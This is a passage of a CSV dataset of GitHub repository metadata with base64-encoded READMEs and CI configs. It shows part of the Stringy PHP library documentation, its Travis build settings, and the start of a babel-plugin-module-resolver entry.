name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
cyB0aGUgc3RyaW5nIHRvIGEgZ2l2ZW4gbGVuZ3RoLCB3aGlsZSBlbnN1cmlu
ZyB0aGF0IGl0IGRvZXMgbm90CnNwbGl0IHdvcmRzLiBJZiAkc3Vic3RyaW5n
IGlzIHByb3ZpZGVkLCBhbmQgdHJ1bmNhdGluZyBvY2N1cnMsIHRoZQpzdHJp
bmcgaXMgZnVydGhlciB0cnVuY2F0ZWQgc28gdGhhdCB0aGUgc3Vic3RyaW5n
IG1heSBiZSBhcHBlbmRlZCB3aXRob3V0CmV4Y2VlZGluZyB0aGUgZGVzaXJl
ZCBsZW5ndGguCgpgYGBwaHAKcygnV2hhdCBhcmUgeW91ciBwbGFucyB0b2Rh
eT8nKS0+c2FmZVRydW5jYXRlKDIyLCAnLi4uJyk7Ci8vICdXaGF0IGFyZSB5
b3VyIHBsYW5zLi4uJwpgYGAKCiMjIyMjIHNodWZmbGUoKQoKQSBtdWx0aWJ5
dGUgc3RyX3NodWZmbGUoKSBmdW5jdGlvbi4gSXQgcmV0dXJucyBhIHN0cmlu
ZyB3aXRoIGl0cyBjaGFyYWN0ZXJzIGluCnJhbmRvbSBvcmRlci4KCmBgYHBo
cApzKCdmw7LDtGLDoMWZJyktPnNodWZmbGUoKTsgLy8gJ8Ogw7TFmWLDsmYn
CmBgYAoKIyMjIyMgc2x1Z2lmeShbLCBzdHJpbmcgJHJlcGxhY2VtZW50ID0g
Jy0nIFssIHN0cmluZyAkbGFuZ3VhZ2UgPSAnZW4nXV0pCgpDb252ZXJ0cyB0
aGUgc3RyaW5nIGludG8gYW4gVVJMIHNsdWcuIFRoaXMgaW5jbHVkZXMgcmVw
bGFjaW5nIG5vbi1BU0NJSQpjaGFyYWN0ZXJzIHdpdGggdGhlaXIgY2xvc2Vz
dCBBU0NJSSBlcXVpdmFsZW50cywgcmVtb3ZpbmcgcmVtYWluaW5nCm5vbi1B
U0NJSSBhbmQgbm9uLWFscGhhbnVtZXJpYyBjaGFyYWN0ZXJzLCBhbmQgcmVw
bGFjaW5nIHdoaXRlc3BhY2Ugd2l0aAokcmVwbGFjZW1lbnQuIFRoZSByZXBs
YWNlbWVudCBkZWZhdWx0cyB0byBhIHNpbmdsZSBkYXNoLCBhbmQgdGhlIHN0
cmluZwppcyBhbHNvIGNvbnZlcnRlZCB0byBsb3dlcmNhc2UuIFRoZSBsYW5n
dWFnZSBvZiB0aGUgc291cmNlIHN0cmluZyBjYW4KYWxzbyBiZSBzdXBwbGll
ZCBmb3IgbGFuZ3VhZ2Utc3BlY2lmaWMgdHJhbnNsaXRlcmF0aW9uLgoKYGBg
cGhwCnMoJ1VzaW5nIHN0cmluZ3MgbGlrZSBmw7LDtCBiw6DFmScpLT5zbHVn
aWZ5KCk7IC8vICd1c2luZy1zdHJpbmdzLWxpa2UtZm9vLWJhcicKYGBgCgoj
IyMjIyBzbGljZShpbnQgJHN0YXJ0IFssIGludCAkZW5kIF0pCgpSZXR1cm5z
IHRoZSBzdWJzdHJpbmcgYmVnaW5uaW5nIGF0ICRzdGFydCwgYW5kIHVwIHRv
LCBidXQgbm90IGluY2x1ZGluZwp0aGUgaW5kZXggc3BlY2lmaWVkIGJ5ICRl
bmQuIElmICRlbmQgaXMgb21pdHRlZCwgdGhlIGZ1bmN0aW9uIGV4dHJhY3Rz
CnRoZSByZW1haW5pbmcgc3RyaW5nLiBJZiAkZW5kIGlzIG5lZ2F0aXZlLCBp
dCBpcyBjb21wdXRlZCBmcm9tIHRoZSBlbmQKb2YgdGhlIHN0cmluZy4KCmBg
YHBocApzKCdmw7LDtGLDoMWZJyktPnNsaWNlKDMsIC0xKTsgLy8gJ2LDoCcK
YGBgCgojIyMjIyBzcGxpdChzdHJpbmcgJHBhdHRlcm4gWywgaW50ICRsaW1p
dCBdKQoKU3BsaXRzIHRoZSBzdHJpbmcgd2l0aCB0aGUgcHJvdmlkZWQgcmVn
dWxhciBleHByZXNzaW9uLCByZXR1cm5pbmcgYW4KYXJyYXkgb2YgU3RyaW5n
eSBvYmplY3RzLiBBbiBvcHRpb25hbCBpbnRlZ2VyICRsaW1pdCB3aWxsIHRy
dW5jYXRlIHRoZQpyZXN1bHRzLgoKYGBgcGhwCnMoJ2ZvbyxiYXIsYmF6Jykt
PnNwbGl0KCcsJywgMik7IC8vIFsnZm9vJywgJ2JhciddCmBgYAoKIyMjIyMg
c3RhcnRzV2l0aChzdHJpbmcgJHN1YnN0cmluZyBbLCBib29sZWFuICRjYXNl
U2Vuc2l0aXZlID0gdHJ1ZSBdKQoKUmV0dXJucyB0cnVlIGlmIHRoZSBzdHJp
bmcgYmVnaW5zIHdpdGggJHN1YnN0cmluZywgZmFsc2Ugb3RoZXJ3aXNlLgpC
eSBkZWZhdWx0LCB0aGUgY29tcGFyaXNvbiBpcyBjYXNlLXNlbnNpdGl2ZSwg
YnV0IGNhbiBiZSBtYWRlIGluc2Vuc2l0aXZlCmJ5IHNldHRpbmcgJGNhc2VT
ZW5zaXRpdmUgdG8gZmFsc2UuCgpgYGBwaHAKcygnRsOSw5Riw6DFmWJheicp
LT5zdGFydHNXaXRoKCdmw7LDtGLDoMWZJywgZmFsc2UpOyAvLyB0cnVlCmBg
YAoKIyMjIyMgc3RhcnRzV2l0aEFueShzdHJpbmdbXSAkc3Vic3RyaW5ncyBb
LCBib29sZWFuICRjYXNlU2Vuc2l0aXZlID0gdHJ1ZSBdKQoKUmV0dXJucyB0
cnVlIGlmIHRoZSBzdHJpbmcgYmVnaW5zIHdpdGggYW55IG9mICRzdWJzdHJp
bmdzLCBmYWxzZQpvdGhlcndpc2UuIEJ5IGRlZmF1bHQgdGhlIGNvbXBhcmlz
b24gaXMgY2FzZS1zZW5zaXRpdmUsIGJ1dCBjYW4gYmUgbWFkZQppbnNlbnNp
dGl2ZSBieSBzZXR0aW5nICRjYXNlU2Vuc2l0aXZlIHRvIGZhbHNlLgoKYGBg
cGhwCnMoJ0bDksOUYsOgxZliYXonKS0+c3RhcnRzV2l0aEFueShbJ2bDssO0
JywgJ2LDoMWZJ10sIGZhbHNlKTsgLy8gdHJ1ZQpgYGAKCiMjIyMjIHN0cmlw
V2hpdGVzcGFjZSgpCgpTdHJpcCBhbGwgd2hpdGVzcGFjZSBjaGFyYWN0ZXJz
LiBUaGlzIGluY2x1ZGVzIHRhYnMgYW5kIG5ld2xpbmUKY2hhcmFjdGVycywg
YXMgd2VsbCBhcyBtdWx0aWJ5dGUgd2hpdGVzcGFjZSBzdWNoIGFzIHRoZSB0
aGluIHNwYWNlCmFuZCBpZGVvZ3JhcGhpYyBzcGFjZS4KCmBgYHBocApzKCcg
ICDOnyAgICAgz4PPhc6zzrPPgc6xz4bOrc6xz4IgICcpLT5zdHJpcFdoaXRl
c3BhY2UoKTsgLy8gJ86fz4PPhc6zzrPPgc6xz4bOrc6xz4InCmBgYAoKIyMj
IyMgc3Vic3RyKGludCAkc3RhcnQgWywgaW50ICRsZW5ndGggXSkKClJldHVy
bnMgdGhlIHN1YnN0cmluZyBiZWdpbm5pbmcgYXQgJHN0YXJ0IHdpdGggdGhl
IHNwZWNpZmllZCAkbGVuZ3RoLgpJdCBkaWZmZXJzIGZyb20gdGhlIG1iX3N1
YnN0cigpIGZ1bmN0aW9uIGluIHRoYXQgcHJvdmlkaW5nIGEgJGxlbmd0aCBv
ZgpudWxsIHdpbGwgcmV0dXJuIHRoZSByZXN0IG9mIHRoZSBzdHJpbmcsIHJh
dGhlciB0aGFuIGFuIGVtcHR5IHN0cmluZy4KCmBgYHBocApzKCdmw7LDtGLD
oMWZJyktPnN1YnN0cigyLCAzKTsgLy8gJ8O0YsOgJwpgYGAKCiMjIyMjIHN1
cnJvdW5kKHN0cmluZyAkc3Vic3RyaW5nKQoKU3Vycm91bmRzIGEgc3RyaW5n
IHdpdGggdGhlIGdpdmVuIHN1YnN0cmluZy4KCmBgYHBocApzKCcgzZwgJykt
PnN1cnJvdW5kKCfKmCcpOyAvLyAnypggzZwgypgnCmBgYAoKIyMjIyMgc3dh
cENhc2UoKQoKUmV0dXJucyBhIGNhc2Ugc3dhcHBlZCB2ZXJzaW9uIG9mIHRo
ZSBzdHJpbmcuCgpgYGBwaHAKcygnzp3PhM6xzr3Ouc67JyktPnN3YXBDYXNl
KCk7IC8vICfOvc6kzpHOnc6ZzpsnCmBgYAoKIyMjIyMgdGlkeSgpCgpSZXR1
cm5zIGEgc3RyaW5nIHdpdGggc21hcnQgcXVvdGVzLCBlbGxpcHNpcyBjaGFy
YWN0ZXJzLCBhbmQgZGFzaGVzIGZyb20KV2luZG93cy0xMjUyIChjb21tb25s
eSB1c2VkIGluIFdvcmQgZG9jdW1lbnRzKSByZXBsYWNlZCBieSB0aGVpciBB
U0NJSSBlcXVpdmFsZW50cy4KCmBgYHBocApzKCfigJxJIHNlZeKApuKAnScp
LT50aWR5KCk7IC8vICciSSBzZWUuLi4iJwpgYGAKCiMjIyMjIHRpdGxlaXpl
KFssIGFycmF5ICRpZ25vcmVdKQoKUmV0dXJucyBhIHRyaW1tZWQgc3RyaW5n
IHdpdGggdGhlIGZpcnN0IGxldHRlciBvZiBlYWNoIHdvcmQgY2FwaXRhbGl6
ZWQuCkFsc28gYWNjZXB0cyBhbiBhcnJheSwgJGlnbm9yZSwgYWxsb3dpbmcg
eW91IHRvIGxpc3Qgd29yZHMgbm90IHRvIGJlCmNhcGl0YWxpemVkLgoKYGBg
cGhwCiRpZ25vcmUgPSBbJ2F0JywgJ2J5JywgJ2ZvcicsICdpbicsICdvZics
ICdvbicsICdvdXQnLCAndG8nLCAndGhlJ107CnMoJ2kgbGlrZSB0byB3YXRj
aCB0ZWxldmlzaW9uJyktPnRpdGxlaXplKCRpZ25vcmUpOwovLyAnSSBMaWtl
IHRvIFdhdGNoIFRlbGV2aXNpb24nCmBgYAoKIyMjIyMgdG9Bc2NpaShbLCBz
dHJpbmcgJGxhbmd1YWdlID0gJ2VuJyBbLCBib29sICRyZW1vdmVVbnN1cHBv
cnRlZCA9IHRydWUgXV0pCgpSZXR1cm5zIGFuIEFTQ0lJIHZlcnNpb24gb2Yg
dGhlIHN0cmluZy4gQSBzZXQgb2Ygbm9uLUFTQ0lJIGNoYXJhY3RlcnMgYXJl
CnJlcGxhY2VkIHdpdGggdGhlaXIgY2xvc2VzdCBBU0NJSSBjb3VudGVycGFy
dHMsIGFuZCB0aGUgcmVzdCBhcmUgcmVtb3ZlZApieSBkZWZhdWx0LiBUaGUg
bGFuZ3VhZ2Ugb3IgbG9jYWxlIG9mIHRoZSBzb3VyY2Ugc3RyaW5nIGNhbiBi
ZSBzdXBwbGllZApmb3IgbGFuZ3VhZ2Utc3BlY2lmaWMgdHJhbnNsaXRlcmF0
aW9uIGluIGFueSBvZiB0aGUgZm9sbG93aW5nIGZvcm1hdHM6CmVuLCBlbl9H
Qiwgb3IgZW4tR0IuIEZvciBleGFtcGxlLCBwYXNzaW5nICJkZSIgcmVzdWx0
cyBpbiAiw6TDtsO8IiBtYXBwaW5nCnRvICJhZW9ldWUiIHJhdGhlciB0aGFu
ICJhb3UiIGFzIGluIG90aGVyIGxhbmd1YWdlcy4KCmBgYHBocApzKCdmw7LD
tGLDoMWZJyktPnRvQXNjaWkoKTsgLy8gJ2Zvb2JhcicKcygnw6TDtsO8Jykt
PnRvQXNjaWkoKTsgLy8gJ2FvdScKcygnw6TDtsO8JyktPnRvQXNjaWkoJ2Rl
Jyk7IC8vICdhZW9ldWUnCmBgYAoKIyMjIyMgdG9Cb29sZWFuKCkKClJldHVy
bnMgYSBib29sZWFuIHJlcHJlc2VudGF0aW9uIG9mIHRoZSBnaXZlbiBsb2dp
Y2FsIHN0cmluZyB2YWx1ZS4KRm9yIGV4YW1wbGUsICd0cnVlJywgJzEnLCAn
b24nIGFuZCAneWVzJyB3aWxsIHJldHVybiB0cnVlLiAnZmFsc2UnLCAnMCcs
CidvZmYnLCBhbmQgJ25vJyB3aWxsIHJldHVybiBmYWxzZS4gSW4gYWxsIGlu
c3RhbmNlcywgY2FzZSBpcyBpZ25vcmVkLgpGb3Igb3RoZXIgbnVtZXJpYyBz
dHJpbmdzLCB0aGVpciBzaWduIHdpbGwgZGV0ZXJtaW5lIHRoZSByZXR1cm4g
dmFsdWUuCkluIGFkZGl0aW9uLCBibGFuayBzdHJpbmdzIGNvbnNpc3Rpbmcg
b2Ygb25seSB3aGl0ZXNwYWNlIHdpbGwgcmV0dXJuCmZhbHNlLiBGb3IgYWxs
IG90aGVyIHN0cmluZ3MsIHRoZSByZXR1cm4gdmFsdWUgaXMgYSByZXN1bHQg
b2YgYQpib29sZWFuIGNhc3QuCgpgYGBwaHAKcygnT0ZGJyktPnRvQm9vbGVh
bigpOyAvLyBmYWxzZQpgYGAKCiMjIyMjIHRvTG93ZXJDYXNlKCkKCkNvbnZl
cnRzIGFsbCBjaGFyYWN0ZXJzIGluIHRoZSBzdHJpbmcgdG8gbG93ZXJjYXNl
LiBBbiBhbGlhcyBmb3IgUEhQJ3MKbWJfc3RydG9sb3dlcigpLgoKYGBgcGhw
CnMoJ0bDksOUQsOAxZgnKS0+dG9Mb3dlckNhc2UoKTsgLy8gJ2bDssO0YsOg
xZknCmBgYAoKIyMjIyMgdG9TcGFjZXMoWywgdGFiTGVuZ3RoID0gNCBdKQoK
Q29udmVydHMgZWFjaCB0YWIgaW4gdGhlIHN0cmluZyB0byBzb21lIG51bWJl
ciBvZiBzcGFjZXMsIGFzIGRlZmluZWQgYnkKJHRhYkxlbmd0aC4gQnkgZGVm
YXVsdCwgZWFjaCB0YWIgaXMgY29udmVydGVkIHRvIDQgY29uc2VjdXRpdmUg
c3BhY2VzLgoKYGBgcGhwCnMoJyBTdHJpbmcgc3BlZWNoID0gIkhpIicpLT50
b1NwYWNlcygpOyAvLyAnICAgIFN0cmluZyBzcGVlY2ggPSAiSGkiJwpgYGAK
CiMjIyMjIHRvVGFicyhbLCB0YWJMZW5ndGggPSA0IF0pCgpDb252ZXJ0cyBl
YWNoIG9jY3VycmVuY2Ugb2Ygc29tZSBjb25zZWN1dGl2ZSBudW1iZXIgb2Yg
c3BhY2VzLCBhcyBkZWZpbmVkCmJ5ICR0YWJMZW5ndGgsIHRvIGEgdGFiLiBC
eSBkZWZhdWx0LCBlYWNoIDQgY29uc2VjdXRpdmUgc3BhY2VzIGFyZQpjb252
ZXJ0ZWQgdG8gYSB0YWIuCgpgYGBwaHAKcygnICAgIGbDssO0ICAgIGLDoMWZ
JyktPnRvVGFicygpOwovLyAnICAgZsOyw7QgYsOgxZknCmBgYAoKIyMjIyMg
dG9UaXRsZUNhc2UoKQoKQ29udmVydHMgdGhlIGZpcnN0IGNoYXJhY3RlciBv
ZiBlYWNoIHdvcmQgaW4gdGhlIHN0cmluZyB0byB1cHBlcmNhc2UuCgpgYGBw
aHAKcygnZsOyw7QgYsOgxZknKS0+dG9UaXRsZUNhc2UoKTsgLy8gJ0bDssO0
IELDoMWZJwpgYGAKCiMjIyMjIHRvVXBwZXJDYXNlKCkKCkNvbnZlcnRzIGFs
bCBjaGFyYWN0ZXJzIGluIHRoZSBzdHJpbmcgdG8gdXBwZXJjYXNlLiBBbiBh
bGlhcyBmb3IgUEhQJ3MKbWJfc3RydG91cHBlcigpLgoKYGBgcGhwCnMoJ2bD
ssO0YsOgxZknKS0+dG9VcHBlckNhc2UoKTsgLy8gJ0bDksOUQsOAxZgnCmBg
YAoKIyMjIyMgdHJpbShbLCBzdHJpbmcgJGNoYXJzXSkKClJldHVybnMgYSBz
dHJpbmcgd2l0aCB3aGl0ZXNwYWNlIHJlbW92ZWQgZnJvbSB0aGUgc3RhcnQg
YW5kIGVuZCBvZiB0aGUKc3RyaW5nLiBTdXBwb3J0cyB0aGUgcmVtb3ZhbCBv
ZiB1bmljb2RlIHdoaXRlc3BhY2UuIEFjY2VwdHMgYW4gb3B0aW9uYWwKc3Ry
aW5nIG9mIGNoYXJhY3RlcnMgdG8gc3RyaXAgaW5zdGVhZCBvZiB0aGUgZGVm
YXVsdHMuCgpgYGBwaHAKcygnICBmw7LDtGLDoMWZICAnKS0+dHJpbSgpOyAv
LyAnZsOyw7Riw6DFmScKYGBgCgojIyMjIyB0cmltTGVmdChbLCBzdHJpbmcg
JGNoYXJzXSkKClJldHVybnMgYSBzdHJpbmcgd2l0aCB3aGl0ZXNwYWNlIHJl
bW92ZWQgZnJvbSB0aGUgc3RhcnQgb2YgdGhlIHN0cmluZy4KU3VwcG9ydHMg
dGhlIHJlbW92YWwgb2YgdW5pY29kZSB3aGl0ZXNwYWNlLiBBY2NlcHRzIGFu
IG9wdGlvbmFsCnN0cmluZyBvZiBjaGFyYWN0ZXJzIHRvIHN0cmlwIGluc3Rl
YWQgb2YgdGhlIGRlZmF1bHRzLgoKYGBgcGhwCnMoJyAgZsOyw7Riw6DFmSAg
JyktPnRyaW1MZWZ0KCk7IC8vICdmw7LDtGLDoMWZICAnCmBgYAoKIyMjIyMg
dHJpbVJpZ2h0KFssIHN0cmluZyAkY2hhcnNdKQoKUmV0dXJucyBhIHN0cmlu
ZyB3aXRoIHdoaXRlc3BhY2UgcmVtb3ZlZCBmcm9tIHRoZSBlbmQgb2YgdGhl
IHN0cmluZy4KU3VwcG9ydHMgdGhlIHJlbW92YWwgb2YgdW5pY29kZSB3aGl0
ZXNwYWNlLiBBY2NlcHRzIGFuIG9wdGlvbmFsCnN0cmluZyBvZiBjaGFyYWN0
ZXJzIHRvIHN0cmlwIGluc3RlYWQgb2YgdGhlIGRlZmF1bHRzLgoKYGBgcGhw
CnMoJyAgZsOyw7Riw6DFmSAgJyktPnRyaW1SaWdodCgpOyAvLyAnICBmw7LD
tGLDoMWZJwpgYGAKCiMjIyMjIHRydW5jYXRlKGludCAkbGVuZ3RoIFssIHN0
cmluZyAkc3Vic3RyaW5nID0gJycgXSkKClRydW5jYXRlcyB0aGUgc3RyaW5n
IHRvIGEgZ2l2ZW4gbGVuZ3RoLiBJZiAkc3Vic3RyaW5nIGlzIHByb3ZpZGVk
LCBhbmQKdHJ1bmNhdGluZyBvY2N1cnMsIHRoZSBzdHJpbmcgaXMgZnVydGhl
ciB0cnVuY2F0ZWQgc28gdGhhdCB0aGUgc3Vic3RyaW5nCm1heSBiZSBhcHBl
bmRlZCB3aXRob3V0IGV4Y2VlZGluZyB0aGUgZGVzaXJlZCBsZW5ndGguCgpg
YGBwaHAKcygnV2hhdCBhcmUgeW91ciBwbGFucyB0b2RheT8nKS0+dHJ1bmNh
dGUoMTksICcuLi4nKTsgLy8gJ1doYXQgYXJlIHlvdXIgcGwuLi4nCmBgYAoK
IyMjIyMgdW5kZXJzY29yZWQoKQoKUmV0dXJucyBhIGxvd2VyY2FzZSBhbmQg
dHJpbW1lZCBzdHJpbmcgc2VwYXJhdGVkIGJ5IHVuZGVyc2NvcmVzLgpVbmRl
cnNjb3JlcyBhcmUgaW5zZXJ0ZWQgYmVmb3JlIHVwcGVyY2FzZSBjaGFyYWN0
ZXJzICh3aXRoIHRoZSBleGNlcHRpb24Kb2YgdGhlIGZpcnN0IGNoYXJhY3Rl
ciBvZiB0aGUgc3RyaW5nKSwgYW5kIGluIHBsYWNlIG9mIHNwYWNlcyBhcyB3
ZWxsIGFzIGRhc2hlcy4KCmBgYHBocApzKCdUZXN0VUNhc2UnKS0+dW5kZXJz
Y29yZWQoKTsgLy8gJ3Rlc3RfdV9jYXNlJwpgYGAKCiMjIyMjIHVwcGVyQ2Ft
ZWxpemUoKQoKUmV0dXJucyBhbiBVcHBlckNhbWVsQ2FzZSB2ZXJzaW9uIG9m
IHRoZSBzdXBwbGllZCBzdHJpbmcuIEl0IHRyaW1zCnN1cnJvdW5kaW5nIHNw
YWNlcywgY2FwaXRhbGl6ZXMgbGV0dGVycyBmb2xsb3dpbmcgZGlnaXRzLCBz
cGFjZXMsIGRhc2hlcwphbmQgdW5kZXJzY29yZXMsIGFuZCByZW1vdmVzIHNw
YWNlcywgZGFzaGVzLCB1bmRlcnNjb3Jlcy4KCmBgYHBocApzKCdVcHBlciBD
YW1lbC1DYXNlJyktPnVwcGVyQ2FtZWxpemUoKTsgLy8gJ1VwcGVyQ2FtZWxD
YXNlJwpgYGAKCiMjIyMjIHVwcGVyQ2FzZUZpcnN0KCkKCkNvbnZlcnRzIHRo
ZSBmaXJzdCBjaGFyYWN0ZXIgb2YgdGhlIHN1cHBsaWVkIHN0cmluZyB0byB1
cHBlciBjYXNlLgoKYGBgcGhwCnMoJ8+DIGZvbycpLT51cHBlckNhc2VGaXJz
dCgpOyAvLyAnzqMgZm9vJwpgYGAKCiMjIEV4dGVuc2lvbnMKClRoZSBmb2xs
b3dpbmcgaXMgYSBsaXN0IG9mIGxpYnJhcmllcyB0aGF0IGV4dGVuZCBTdHJp
bmd5OgoKICogW1NsaWNlYWJsZVN0cmluZ3ldKGh0dHBzOi8vZ2l0aHViLmNv
bS9kYW5pZWxzdGp1bGVzL1NsaWNlYWJsZVN0cmluZ3kpOgpQeXRob24tbGlr
ZSBzdHJpbmcgc2xpY2VzIGluIFBIUAogKiBbU3ViU3RyaW5neV0oaHR0cHM6
Ly9naXRodWIuY29tL1RDQjEzL1N1YlN0cmluZ3kpOgpBZHZhbmNlZCBzdWJz
dHJpbmcgbWV0aG9kcwoKIyMgVGVzdHMKCkZyb20gdGhlIHByb2plY3QgZGly
ZWN0b3J5LCB0ZXN0cyBjYW4gYmUgcmFuIHVzaW5nIGBwaHB1bml0YAoKIyMg
TGljZW5zZQoKUmVsZWFzZWQgdW5kZXIgdGhlIE1JVCBMaWNlbnNlIC0gc2Vl
IGBMSUNFTlNFLnR4dGAgZm9yIGRldGFpbHMuCg==
",,"bGFuZ3VhZ2U6IHBocAoKcGhwOgogIC0gaGh2bQoKIyBUaGlzIHRyaWdnZXJz
IGJ1aWxkcyB0byBydW4gb24gdGhlIG5ldyBUcmF2aXNDSSBpbmZyYXN0cnVj
dHVyZS4KIyBTZWU6IGh0dHA6Ly9kb2NzLnRyYXZpcy1jaS5jb20vdXNlci93
b3JrZXJzL2NvbnRhaW5lci1iYXNlZC1pbmZyYXN0cnVjdHVyZS8Kc3Vkbzog
ZmFsc2UKCm1hdHJpeDoKICBmYXN0X2ZpbmlzaDogdHJ1ZQogIGluY2x1ZGU6
CiAgICAtIHBocDogNS40CiAgICAgIGVudjogcG9seWZpbGw9J3RydWUnCiAg
ICAtIHBocDogNS40CiAgICAgIGVudjogcG9seWZpbGw9J2ZhbHNlJwogICAg
LSBwaHA6IDUuNQogICAgICBlbnY6IHBvbHlmaWxsPSd0cnVlJwogICAgLSBw
aHA6IDUuNQogICAgICBlbnY6IHBvbHlmaWxsPSdmYWxzZScKICAgIC0gcGhw
OiA1LjYKICAgICAgZW52OiBwb2x5ZmlsbD0ndHJ1ZScKICAgIC0gcGhwOiA1
LjYKICAgICAgZW52OiBwb2x5ZmlsbD0nZmFsc2UnCiAgICAtIHBocDogNy4w
CiAgICAgIGVudjogcG9seWZpbGw9J3RydWUnCiAgICAtIHBocDogNy4wCiAg
ICAgIGVudjogcG9seWZpbGw9J2ZhbHNlJwogICAgLSBwaHA6IDcuMQogICAg
ICBlbnY6IHBvbHlmaWxsPSd0cnVlJwogICAgLSBwaHA6IDcuMQogICAgICBl
bnY6IHBvbHlmaWxsPSdmYWxzZScKCmluc3RhbGw6IHRyYXZpc19yZXRyeSBj
b21wb3NlciBpbnN0YWxsIC0tbm8taW50ZXJhY3Rpb24gLS1wcmVmZXItc291
cmNlCgpiZWZvcmVfc2NyaXB0OgogIC0gdHJhdmlzX3JldHJ5IGNvbXBvc2Vy
IHNlbGYtdXBkYXRlCiAgLSB0cmF2aXNfcmV0cnkgY29tcG9zZXIgaW5zdGFs
bCAtLW5vLWludGVyYWN0aW9uIC0tcHJlZmVyLXNvdXJjZQogIC0gaWYgW1sg
JHBvbHlmaWxsID0gJ2ZhbHNlJyBdXTsgdGhlbiB0cmF2aXNfcmV0cnkgY29t
cG9zZXIgcmVtb3ZlIHN5bWZvbnkvcG9seWZpbGwtbWJzdHJpbmc7IGZpCgpz
Y3JpcHQ6CiAgLSB2ZW5kb3IvYmluL3BocHVuaXQKCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'babel-plugin-module-resolver',40821265,b'Custom module resolver plugin for Babel',b'JavaScript',72,2381,,2381,False,b'https://api.github.com/repos/tleunen/babel-plugin-module-resolver/forks',"IyBiYWJlbC1wbHVnaW4tbW9kdWxlLXJlc29sdmVyClshW01haW50ZW5hbmNl
IFN0YXR1c11bc3RhdHVzLWltYWdlXV1bc3RhdHVzLXVybF0gWyFbTlBNIHZl
cnNpb25dW25wbS1pbWFnZV1dW25wbS11cmxdIFshW0J1aWxkIFN0YXR1cyBM
aW51eF1bY2lyY2xlY2ktaW1hZ2VdXVtjaXJjbGVjaS11cmxdIFshW0J1aWxk
IFN0YXR1cyBXaW5kb3dzXVthcHB2ZXlvci1pbWFnZV1dW2FwcHZleW9yLXVy
bF0gWyFbQ292ZXJhZ2UgU3RhdHVzXVtjb3ZlcmFnZS1pbWFnZV1dW2NvdmVy
YWdlLXVybF0KCkEgW0JhYmVsXShodHRwOi8vYmFiZWxqcy5pbykgcGx1Z2lu
IHRvIGFkZCBhIG5ldyByZXNvbHZlciBmb3IgeW91ciBtb2R1bGVzIHdoZW4g
Y29tcGlsaW5nIHlvdXIgY29kZSB1c2luZyBCYWJlbC4gVGhpcyBwbHVnaW4g
YWxsb3dzIHlvdSB0byBhZGQgbmV3ICJyb290IiBkaXJlY3RvcmllcyB0aGF0
IGNvbnRhaW4geW91ciBtb2R1bGVzLiBJdCBhbHNvIGFsbG93cyB5b3UgdG8g
c2V0dXAgYSBjdXN0b20gYWxpYXMgZm9yIGRpcmVjdG9yaWVzLCBzcGVjaWZp
YyBmaWxlcywgb3IgZXZlbiBvdGhlciBucG0gbW9kdWxlcy4KCiMjIERlc2Ny
aXB0aW9uCgpUaGlzIHBsdWdpbiBjYW4gc2ltcGxpZnkgdGhlIHJlcXVpcmUv
aW1wb3J0IHBhdGhzIGluIHlvdXIgcHJvamVjdC4gRm9yIGV4YW1wbGUsIGlu
c3RlYWQgb2YgdXNpbmcgY29tcGxleCByZWxhdGl2ZSBwYXRocyBsaWtlIGAu
Li8uLi8uLi8uLi91dGlscy9teS11dGlsc2AsIHlvdSBjYW4gd3JpdGUgYHV0
